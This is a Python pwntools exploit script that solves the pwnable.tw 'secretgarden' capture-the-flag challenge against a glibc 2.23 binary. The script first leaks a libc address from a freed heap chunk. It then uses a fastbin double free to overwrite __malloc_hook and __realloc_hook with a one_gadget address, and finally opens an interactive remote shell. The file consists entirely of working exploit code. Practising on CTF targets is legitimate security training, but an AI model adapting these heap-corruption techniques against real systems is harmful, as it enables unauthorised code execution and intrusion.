#!/usr/bin/env python3
from pwn import *

#context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

elf = ELF('./secretgarden_patched')
libc = ELF('./libc_64.so.6')
ld = ELF('./ld-2.23.so')

context.binary = elf

ENCODING = 'ISO-8859-1'
s = lambda senddata : p.send(senddata.encode(ENCODING))
sa = lambda recvdata, senddata : p.sendafter(recvdata.encode(ENCODING), senddata.encode(ENCODING))
sl = lambda senddata : p.sendline(senddata.encode(ENCODING))
sla = lambda recvdata, senddata : p.sendlineafter(recvdata.encode(ENCODING), senddata.encode(ENCODING))
r = lambda numb=0x3f3f3f3f, timeout=0x3f3f3f3f : p.recv(numb, timeout=timeout).decode(ENCODING)
ru = lambda recvdata, timeout=0x3f3f3f3f : p.recvuntil(recvdata.encode(ENCODING), timeout=timeout).decode(ENCODING)
uu32 = lambda data : u32(data.encode(ENCODING), signed='unsigned')
uu64 = lambda data : u64(data.encode(ENCODING), signed='unsigned')
iu32 = lambda data : u32(data.encode(ENCODING), signed='signed')
iu64 = lambda data : u64(data.encode(ENCODING), signed='signed')
up32 = lambda data : p32(data, signed='unsigned').decode(ENCODING)
up64 = lambda data : p64(data, signed='unsigned').decode(ENCODING)
ip32 = lambda data : p32(data, signed='signed').decode(ENCODING)
ip64 = lambda data : p64(data, signed='signed').decode(ENCODING)

local = 0
if local:
    p = process([elf.path])
else:
    p = remote('chall.pwnable.tw', 10203)

def add(sz, data, color):
    sa('Your choice : ', '1')
    sla('Length of the name :', str(sz))
    sa('The name of flower :', data)
    sla('The color of the flower :', color)

def show():
    sa('Your choice : ', '2')

def delete(idx):
    sa('Your choice : ', '3')
    sla('Which flower do you want to remove from the garden:', str(idx))

def clean():
    sa('Your choice : ', '3')

# leak libc
add(0x150, '0', '0') # 0
add(0x18, '1', '1') # 1
delete(0)
add(0x18, '2' * 8, '2') # 2
show()
ru('Name of the flower[2] :' + '2' * 8)
libc_base = uu64(ru('\n')[:-1].ljust(8, '\x00')) - 0x3c3b78
info('libc_base = ' + hex(libc_base))
system = libc_base + libc.sym['system']
info('system = ' + hex(system))
free_hook = libc_base + libc.sym['__free_hook']
info('free_hook = ' + hex(free_hook))
malloc_hook = libc_base + libc.sym['__malloc_hook']
info('malloc_hook = ' + hex(malloc_hook))
realloc = libc_base + libc.sym['__libc_realloc']
info('realloc = ' + hex(realloc))

# overwrite `__malloc_hook`
add(0x68, '3', '3') # 3
add(0x68, '4', '4') # 4
delete(3)
delete(4)
delete(3)
add(0x68, up64(malloc_hook - 0x23), '5') # 5
add(0x68, '6', '6') # 6
add(0x68, '7', '7') # 7
one_gadgets = [0x45216, 0x4526a, 0xef6c4, 0xf0567]
one_gadget = libc_base + one_gadgets[2] # only this one work with `__realloc_hook`
info('one_gadget = ' + hex(one_gadget))
add(0x68, 0xb * 'A' + up64(one_gadget) + up64(realloc + 0x14), '8') # 8

# get shell
#gdb.attach(p)
sa('Your choice : ', '1')

p.interactive()

